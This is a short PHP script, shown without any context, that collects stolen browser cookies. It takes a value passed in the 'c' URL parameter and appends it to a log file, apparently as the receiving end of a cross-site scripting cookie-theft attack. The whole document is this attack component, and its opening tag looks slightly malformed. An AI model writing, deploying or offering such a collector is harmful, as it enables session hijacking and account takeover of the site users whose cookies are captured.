<?php>
  $cookie = $_GET["c"];
  $file = fopen('logs.txt','a');
  fwrite($file,$cookie . "\n\n");
?>
